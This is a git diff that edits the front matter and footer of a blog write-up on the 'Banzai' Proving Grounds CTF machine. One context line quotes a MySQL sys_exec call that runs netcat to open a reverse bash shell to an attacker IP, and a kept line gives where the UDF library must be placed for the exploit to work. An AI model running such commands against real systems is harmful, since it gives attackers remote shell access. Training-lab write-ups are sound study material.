@@ -2,19 +2,10 @@
 title: "Proving grounds Practice: Banzai"
 layout: post
 date: 2024-01-15 02:00
-tag: 
-- CTF
-- Offsec labs
-- OSCP
-- Writeup
-- Linux
-- PG-Practice
-- 
-writeups: true
-hidden: true
-author: Naveen
-description: "Offsec proving grounds practice linux machine writeup"
+categories: writeup
 ---
+
+Proving grounds Practice - Banzai CTF writeup.
 
 # NMAP
 
@@ -126,4 +117,4 @@ select sys_exec('nc -e /bin/bash 192.168.45.160 22');
 ## Important Takeaway
 - The lib file has to be place in /usr/lib/mysql/plugin/lib_mysqludf_sys_64.so folder else the exploit won't work.
 
-For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).
+For more updates and insights, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).
